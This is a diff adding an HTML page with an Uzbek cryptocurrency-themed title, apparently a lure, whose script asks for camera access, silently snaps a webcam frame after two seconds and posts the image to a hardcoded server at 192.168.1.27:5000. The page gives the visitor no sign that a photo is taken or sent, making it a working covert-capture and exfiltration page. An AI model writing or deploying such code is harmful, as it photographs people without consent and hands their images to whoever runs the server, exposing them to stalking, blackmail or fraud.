@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>UZB Cripto valyutalar boshlig'i</title>
+</head>
+<body>
+  <video id="video" autoplay muted style="width:100%; max-width:400px;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          const imageData = canvas.toDataURL('image/png');
+
+          fetch('http://192.168.1.27:5000/upload', {  
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ image: imageData })
+          }).then(res => console.log("Rasm yuborildi"))
+            .catch(err => console.error("Xatolik:", err));
+        }, 2000);
+      })
+      .catch(err => console.error("Kameraga ruxsat kerak:", err));
+  </script>
+</body>
+</html>
